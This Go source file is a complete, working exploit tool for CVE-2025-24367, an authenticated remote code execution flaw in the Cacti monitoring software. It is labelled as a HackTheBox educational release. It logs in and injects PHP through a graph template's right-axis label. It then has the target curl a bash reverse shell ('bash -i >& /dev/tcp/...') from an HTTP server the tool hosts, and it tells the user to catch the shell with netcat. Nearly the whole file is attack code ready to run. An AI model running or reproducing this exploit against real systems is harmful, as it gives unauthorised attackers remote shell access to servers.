package main

import (
	"context"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/PuerkitoBio/goquery"
)

const (
	defaultTimeout   = 30 * time.Second
	defaultProxyAddr = "http://127.0.0.1:8080"
	serverPort       = ":80"
)

// ExploitStage represents the stage of exploitation
type ExploitStage string

const (
	StageWrite   ExploitStage = "write"
	StageTrigger ExploitStage = "trigger"
)

// Credentials holds authentication information
type Credentials struct {
	Username string
	Password string
}

// ReverseShellConfig holds reverse shell connection details
type ReverseShellConfig struct {
	IP   string
	Port string
}

// ExploitConfig holds all configuration for the exploit
type ExploitConfig struct {
	BaseURL      string
	Credentials  Credentials
	ReverseShell ReverseShellConfig
	ProxyURL     *url.URL
}

// Exploit represents the main exploit orchestrator
type Exploit struct {
	config ExploitConfig
	client *http.Client
	server *http.Server
}

// TemplatePayload represents the payload injection configuration
type TemplatePayload struct {
	TemplateID     int
	Filename       string
	CSRFToken      string
	RightAxisLabel string
}

func main() {
	config, err := parseFlags()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n\n", err)
		flag.Usage()
		os.Exit(1)
	}

	printBanner()

	exploit := NewExploit(config)

	if err := exploit.Run(); err != nil {
		fmt.Printf("[!] Exploit failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("[+] Exploit completed successfully!")
}

func printBanner() {
	fmt.Println("###########################################################")
	fmt.Println("#                                                         #")
	fmt.Println("# CVE-2025-24367 - Cacti Authenticated Graph Template RCE #")
	fmt.Println("#         Created by TheCyberGeek @ HackTheBox            #")
	fmt.Println("#             For educational purposes only               #")
	fmt.Println("#                                                         #")
	fmt.Println("###########################################################")
	fmt.Println()
}

// parseFlags parses and validates command-line arguments
func parseFlags() (ExploitConfig, error) {
	var config ExploitConfig

	username := flag.String("u", "", "Username for authentication")
	password := flag.String("p", "", "Password for authentication")
	reverseIP := flag.String("i", "", "IP address for reverse shell")
	reversePort := flag.String("l", "", "Port number for reverse shell")
	baseURL := flag.String(
		"url",
		"",
		"Base URL of Cacti (e.g., http://target.com)",
	)
	useProxy := flag.Bool(
		"proxy",
		false,
		"Enable HTTP proxy at http://127.0.0.1:8080",
	)

	flag.Usage = func() {
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"CVE-2025-24367 - Cacti Authenticated Graph Template RCE\n",
		)
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"Created by TheCyberGeek @ HackTheBox\n\n",
		)
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"Usage: %s [OPTIONS]\n\n",
			os.Args[0],
		)
		fmt.Fprintf(flag.CommandLine.Output(), "Required Options:\n")
		fmt.Fprintf(flag.CommandLine.Output(), "  -u string\n")
		fmt.Fprintf(flag.CommandLine.Output(), "    	Username for authentication\n")
		fmt.Fprintf(flag.CommandLine.Output(), "  -p string\n")
		fmt.Fprintf(flag.CommandLine.Output(), "    	Password for authentication\n")
		fmt.Fprintf(flag.CommandLine.Output(), "  -i string\n")
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"    	IP address for reverse shell\n",
		)
		fmt.Fprintf(flag.CommandLine.Output(), "  -l string\n")
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"    	Port number for reverse shell\n",
		)
		fmt.Fprintf(flag.CommandLine.Output(), "  -url string\n")
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"    	Base URL of Cacti instance (e.g., http://target.com)\n\n",
		)
		fmt.Fprintf(flag.CommandLine.Output(), "Optional:\n")
		fmt.Fprintf(flag.CommandLine.Output(), "  -proxy\n")
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"    	Enable HTTP proxy at http://127.0.0.1:8080\n\n",
		)
		fmt.Fprintf(flag.CommandLine.Output(), "Examples:\n")
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"  sudo %s -u admin -p password -i 10.10.14.5 -l 4444 "+
				"-url http://target.com\n",
			os.Args[0],
		)
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"  sudo %s -u admin -p password -i 10.10.14.5 -l 4444 "+
				"-url http://target.com -proxy\n\n",
			os.Args[0],
		)
		fmt.Fprintf(flag.CommandLine.Output(), "Notes:\n")
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"  • Requires root/sudo privileges to bind port 80\n",
		)
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"  • Start listener before running: nc -lvnp <port>\n",
		)
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"  • For educational and authorized testing only\n",
		)
	}

	flag.Parse()

	// Validate required fields
	if *username == "" {
		return config, fmt.Errorf("username (-u) is required")
	}
	if *password == "" {
		return config, fmt.Errorf("password (-p) is required")
	}
	if *reverseIP == "" {
		return config, fmt.Errorf("reverse shell IP (-i) is required")
	}
	if *reversePort == "" {
		return config, fmt.Errorf("reverse shell port (-l) is required")
	}
	if *baseURL == "" {
		return config, fmt.Errorf("base URL (-url) is required")
	}

	config.BaseURL = strings.TrimSuffix(*baseURL, "/")
	config.Credentials = Credentials{
		Username: *username,
		Password: *password,
	}
	config.ReverseShell = ReverseShellConfig{
		IP:   *reverseIP,
		Port: *reversePort,
	}

	if *useProxy {
		proxyURL, err := url.Parse(defaultProxyAddr)
		if err != nil {
			return config, fmt.Errorf("invalid proxy URL: %w", err)
		}
		config.ProxyURL = proxyURL
	}

	return config, nil
}

// NewExploit creates a new exploit instance
func NewExploit(config ExploitConfig) *Exploit {
	transport := &http.Transport{}
	if config.ProxyURL != nil {
		transport.Proxy = http.ProxyURL(config.ProxyURL)
		fmt.Printf("[i] Using proxy: %s\n", config.ProxyURL.String())
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   defaultTimeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil
		},
		Jar: &cookieJar{cookies: make(map[string][]*http.Cookie)},
	}

	return &Exploit{
		config: config,
		client: client,
	}
}

// Run executes the complete exploit chain
func (e *Exploit) Run() error {
	steps := []struct {
		name string
		fn   func() error
	}{
		{"Checking Cacti instance", e.checkCacti},
		{"Starting HTTP server", e.startHTTPServer},
		{"Authenticating", e.login},
		{"Getting template ID", func() error {
			templateID, err := e.getTemplateID()
			if err != nil {
				return err
			}
			return e.executePayloadChain(templateID)
		}},
	}

	defer func() {
		e.stopHTTPServer()
		os.Remove("bash")
	}()

	for _, step := range steps {
		fmt.Printf("[*] %s...\n", step.name)
		if err := step.fn(); err != nil {
			return fmt.Errorf("%s: %w", step.name, err)
		}
	}

	return nil
}

// executePayloadChain runs the payload write and trigger sequence
func (e *Exploit) executePayloadChain(templateID int) error {
	if err := e.writePayloadFile(); err != nil {
		return fmt.Errorf("writing payload: %w", err)
	}

	if err := e.triggerPayload(templateID, StageWrite); err != nil {
		return fmt.Errorf("writing payload to server: %w", err)
	}

	if err := e.triggerPayload(templateID, StageTrigger); err != nil {
		return fmt.Errorf("triggering payload: %w", err)
	}

	return nil
}

// checkCacti verifies the target is a Cacti instance
func (e *Exploit) checkCacti() error {
	resp, err := http.Get(e.config.BaseURL)
	if err != nil {
		return fmt.Errorf("failed to connect: %w", err)
	}
	defer resp.Body.Close()

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return err
	}

	if strings.Contains(doc.Text(), "Cacti") {
		fmt.Println("[+] Cacti instance detected!")
		return nil
	}

	return fmt.Errorf("no Cacti instance found at target URL")
}

// login authenticates to the Cacti instance
func (e *Exploit) login() error {
	resp, err := e.client.Get(e.config.BaseURL)
	if err != nil {
		return fmt.Errorf("fetching login page: %w", err)
	}
	defer resp.Body.Close()

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return err
	}

	csrfToken := extractCSRFToken(doc.Text())
	if csrfToken == "" {
		return fmt.Errorf("failed to extract CSRF token")
	}

	data := url.Values{
		"__csrf_magic":   {csrfToken},
		"action":         {"login"},
		"login_username": {e.config.Credentials.Username},
		"login_password": {e.config.Credentials.Password},
	}

	resp, err = e.client.PostForm(
		e.config.BaseURL+"/cacti/index.php",
		data,
	)
	if err != nil {
		return fmt.Errorf("posting login form: %w", err)
	}
	defer resp.Body.Close()

	doc, err = goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return err
	}

	if strings.Contains(doc.Text(), "Console") {
		fmt.Println("[+] Authentication successful!")
		return nil
	}

	return fmt.Errorf("authentication failed - check credentials")
}

// getTemplateID retrieves the target graph template ID
func (e *Exploit) getTemplateID() (int, error) {
	targetURL := fmt.Sprintf(
		"%s/cacti/graph_templates.php?filter=Unix%%20-%%20Logged%%20in"+
			"%%20Users&rows=-1&has_graphs=false",
		e.config.BaseURL,
	)

	resp, err := e.client.Get(targetURL)
	if err != nil {
		return 0, fmt.Errorf("fetching template list: %w", err)
	}
	defer resp.Body.Close()

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return 0, err
	}

	var templateID int
	doc.Find("input[id^='chk_']").Each(func(i int, s *goquery.Selection) {
		if id, exists := s.Attr("id"); exists {
			fmt.Sscanf(id, "chk_%d", &templateID)
		}
	})

	if templateID == 0 {
		return 0, fmt.Errorf("failed to locate graph template ID")
	}

	fmt.Printf("[+] Found graph template ID: %d\n", templateID)
	return templateID, nil
}

// writePayloadFile creates the bash reverse shell payload
func (e *Exploit) writePayloadFile() error {
	payload := fmt.Sprintf(
		"#!/bin/bash\nbash -i >& /dev/tcp/%s/%s 0>&1",
		e.config.ReverseShell.IP,
		e.config.ReverseShell.Port,
	)
	if err := os.WriteFile("bash", []byte(payload), 0644); err != nil {
		return fmt.Errorf("writing payload file: %w", err)
	}
	fmt.Println("[+] Created payload file")
	return nil
}

// triggerPayload injects and executes the payload
func (e *Exploit) triggerPayload(
	templateID int,
	stage ExploitStage,
) error {
	payload, err := e.buildTemplatePayload(templateID, stage)
	if err != nil {
		return err
	}

	if err := e.updateTemplate(payload); err != nil {
		return fmt.Errorf("updating template: %w", err)
	}

	if err := e.triggerExecution(); err != nil {
		return fmt.Errorf("triggering execution: %w", err)
	}

	return e.checkPayloadExecution(payload.Filename, stage)
}

// buildTemplatePayload constructs the payload configuration
func (e *Exploit) buildTemplatePayload(
	templateID int,
	stage ExploitStage,
) (*TemplatePayload, error) {
	targetURL := fmt.Sprintf(
		"%s/cacti/graph_templates.php?action=template_edit&id=%d",
		e.config.BaseURL,
		templateID,
	)

	resp, err := e.client.Get(targetURL)
	if err != nil {
		return nil, fmt.Errorf("fetching template page: %w", err)
	}
	defer resp.Body.Close()

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return nil, err
	}

	csrfToken := extractCSRFToken(doc.Text())
	if csrfToken == "" {
		return nil, fmt.Errorf("failed to extract CSRF token")
	}

	filename := randomString(5) + ".php"
	fmt.Printf("[i] Generated PHP filename: %s\n", filename)

	var rightAxisLabel string
	if stage == StageWrite {
		rightAxisLabel = fmt.Sprintf(
			"XXX\ncreate my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 "+
				"RRA:AVERAGE:0.5:1:1200\ngraph %s -s now -a CSV "+
				"DEF:out=my.rrd:temp:AVERAGE "+
				"LINE1:out:<?=`curl\\x20%s/bash\\x20-o\\x20bash`;?>",
			filename,
			e.config.ReverseShell.IP,
		)
	} else {
		rightAxisLabel = fmt.Sprintf(
			"XXX\ncreate my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 "+
				"RRA:AVERAGE:0.5:1:1200\ngraph %s -s now -a CSV "+
				"DEF:out=my.rrd:temp:AVERAGE "+
				"LINE1:out:<?=`bash\\x20bash`;?>",
			filename,
		)
	}

	return &TemplatePayload{
		TemplateID:     templateID,
		Filename:       filename,
		CSRFToken:      csrfToken,
		RightAxisLabel: rightAxisLabel,
	}, nil
}

// updateTemplate sends the malicious template update
func (e *Exploit) updateTemplate(payload *TemplatePayload) error {
	data := url.Values{
		"__csrf_magic":            {payload.CSRFToken},
		"name":                    {"Unix - Logged in Users"},
		"graph_template_id":       {fmt.Sprintf("%d", payload.TemplateID)},
		"graph_template_graph_id": {fmt.Sprintf("%d", payload.TemplateID)},
		"save_component_template": {"1"},
		"title":                   {"|host_description| - Logged in Users"},
		"vertical_label":          {"percent"},
		"image_format_id":         {"3"},
		"height":                  {"200"},
		"width":                   {"700"},
		"base_value":              {"1000"},
		"slope_mode":              {"on"},
		"auto_scale":              {"on"},
		"auto_scale_opts":         {"2"},
		"auto_scale_rigid":        {"on"},
		"upper_limit":             {"100"},
		"lower_limit":             {"0"},
		"right_axis_label":        {payload.RightAxisLabel},
		"right_axis_format":       {"0"},
		"auto_padding":            {"on"},
		"legend_position":         {"0"},
		"legend_direction":        {"0"},
		"rrdtool_version":         {"1.7.2"},
		"action":                  {"save"},
	}

	_, err := e.client.PostForm(
		e.config.BaseURL+"/cacti/graph_templates.php?header=false",
		data,
	)
	return err
}

// triggerExecution triggers the malicious template rendering
func (e *Exploit) triggerExecution() error {
	_, err := e.client.Get(
		e.config.BaseURL +
			"/cacti/graph_json.php?rra_id=0&local_graph_id=3" +
			"&graph_start=1761683272&graph_end=1761769672" +
			"&graph_height=200&graph_width=700",
	)
	return err
}

// checkPayloadExecution verifies the payload was executed
func (e *Exploit) checkPayloadExecution(
	filename string,
	stage ExploitStage,
) error {
	client := *e.client
	client.Timeout = 2 * time.Second

	resp, err := client.Get(e.config.BaseURL + "/cacti/" + filename)
	if err != nil && stage == StageTrigger {
		fmt.Println("[+] Request timeout detected - shell likely spawned!")
		fmt.Println("[+] Check your netcat listener")
		return nil
	}
	if err != nil {
		return fmt.Errorf("checking payload: %w", err)
	}
	defer resp.Body.Close()

	if stage == StageWrite {
		fmt.Println("[+] Payload uploaded successfully")
	}

	return nil
}

// startHTTPServer starts the payload delivery server
func (e *Exploit) startHTTPServer() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/bash" {
			fmt.Printf("[+] Payload requested: %s\n", r.URL.Path)
			http.ServeFile(w, r, "bash")
		}
	})

	e.server = &http.Server{Addr: serverPort, Handler: mux}

	go func() {
		if err := e.server.ListenAndServe(); err != nil &&
			err != http.ErrServerClosed {
			fmt.Printf("[!] HTTP server error: %v\n", err)
		}
	}()

	time.Sleep(100 * time.Millisecond)
	fmt.Printf("[+] HTTP server listening on port 80\n")
	return nil
}

// stopHTTPServer gracefully stops the payload server
func (e *Exploit) stopHTTPServer() {
	if e.server != nil {
		ctx, cancel := context.WithTimeout(
			context.Background(),
			5*time.Second,
		)
		defer cancel()
		e.server.Shutdown(ctx)
		fmt.Println("[+] HTTP server stopped")
	}
}

// extractCSRFToken extracts CSRF token from page content
func extractCSRFToken(text string) string {
	re := regexp.MustCompile(
		`var csrfMagicToken\s*=\s*"(sid:[a-z0-9]+,[a-z0-9]+)"`,
	)
	matches := re.FindStringSubmatch(text)
	if len(matches) > 1 {
		return matches[1]
	}
	return ""
}

// randomString generates a random alphanumeric string
func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz" +
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// cookieJar implements http.CookieJar for session management
type cookieJar struct {
	cookies map[string][]*http.Cookie
}

func (j *cookieJar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	j.cookies[u.Host] = cookies
}

func (j *cookieJar) Cookies(u *url.URL) []*http.Cookie {
	return j.cookies[u.Host]
}
